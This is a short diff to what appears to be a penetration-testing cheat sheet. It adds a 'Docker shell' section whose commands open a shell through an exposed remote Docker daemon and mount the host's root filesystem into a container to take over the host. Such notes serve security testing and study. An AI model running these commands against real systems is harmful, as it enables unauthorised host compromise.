@@ -470,3 +470,11 @@ https://tools.kali.org/password-attacks/cewl
 ```
 cewl -w wordlist.txt -d 2 -m <IP_ADDRESS>
 ```
+
+### Docker shell
+```
+docker -H <IP>:<PORT> exec -it <container> /bin/bash
+
+docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt sh
+docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt /bin/bash
+```
